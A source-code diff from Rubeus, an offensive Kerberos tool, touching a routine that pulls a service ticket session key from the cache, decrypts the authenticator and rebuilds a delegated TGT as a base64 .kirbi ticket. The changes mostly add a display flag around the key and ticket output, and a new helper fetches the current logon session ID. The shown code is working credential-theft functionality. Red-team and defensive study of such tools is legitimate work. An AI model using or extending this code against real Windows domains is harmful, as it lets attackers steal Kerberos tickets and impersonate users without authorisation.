                                         byte[] key = GetEncryptionKeyFromCache(targetSPN, authenticatorEtype);
@@ -1483,7 +2219,10 @@ namespace Rubeus
                                         if (key != null)
                                         {
                                             string base64SessionKey = Convert.ToBase64String(key);
-                                            Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}", base64SessionKey);
+                                            if (display)
+                                            {
+                                                Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}", base64SessionKey);
+                                            }
 
                                             // KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR = 11
                                             byte[] rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);
@@ -1494,7 +2233,10 @@ namespace Rubeus
                                             {
                                                 if (elt2.TagValue == 3)
                                                 {
-                                                    Console.WriteLine("[+] Successfully decrypted the authenticator");
+                                                    if (display)
+                                                    {
+                                                        Console.WriteLine("[+] Successfully decrypted the authenticator");
+                                                    }
 
                                                     int cksumtype = Convert.ToInt32(elt2.Sub[0].Sub[0].Sub[0].GetInteger());
 
@@ -1539,12 +2281,15 @@ namespace Rubeus
                                                             byte[] kirbiBytes = cred.Encode().Encode();
                                                             string kirbiString = Convert.ToBase64String(kirbiBytes);
 
-                                                            Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
-
-                                                            // display the .kirbi base64, columns of 80 chararacters
-                                                            foreach (string line in Helpers.Split(kirbiString, 80))
+                                                            if (display)
                                                             {
-                                                                Console.WriteLine("      {0}", line);
+                                                                Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
+
+                                                                // display the .kirbi base64, columns of 80 chararacters
+                                                                foreach (string line in Helpers.Split(kirbiString, 80))
+                                                                {
+                                                                    Console.WriteLine("      {0}", line);
+                                                                }
                                                             }
 
                                                             finalTGTBytes = kirbiBytes;
@@ -1584,9 +2329,6 @@ namespace Rubeus
                 }
                 // cleanup 1
                 Interop.DeleteSecurityContext(ref ClientContext);
-
-                // cleanup 2
-                //Interop.FreeContextBuffer(ref ClientToken.pBuffers);
             }
             else
             {
@@ -1596,6 +2338,36 @@ namespace Rubeus
             // cleanup 2
             Interop.FreeCredentialsHandle(ref phCredential);
             return finalTGTBytes;
+        }
+
+        public static Interop.LUID GetCurrentLUID()
+        {
+            // helper that returns the current logon session ID
+
+            int TokenInfLength = 0;
+            Interop.LUID luid = new Interop.LUID();
+
+            // first call gets lenght of TokenInformation to get proper struct size
+            bool Result = Interop.GetTokenInformation(WindowsIdentity.GetCurrent().Token, Interop.TOKEN_INFORMATION_CLASS.TokenOrigin, IntPtr.Zero, TokenInfLength, out TokenInfLength);
+
+            IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
+
+            // second call actually gets the information
+            Result = Interop.GetTokenInformation(WindowsIdentity.GetCurrent().Token, Interop.TOKEN_INFORMATION_CLASS.TokenOrigin, TokenInformation, TokenInfLength, out TokenInfLength);
+
+            if (Result)
+            {
+                Interop.TOKEN_ORIGIN TokenOrigin = (Interop.TOKEN_ORIGIN)Marshal.PtrToStructure(TokenInformation, typeof(Interop.TOKEN_ORIGIN));
+                luid = new Interop.LUID(TokenOrigin.OriginatingLogonSession);
+            }
+            else
+            {
+                uint lastError = Interop.GetLastError();
+                Console.WriteLine("[X] GetTokenInformation error: {0}", lastError);
+                Marshal.FreeHGlobal(TokenInformation);
+            }
+
+            return luid;
         }
     }
 }
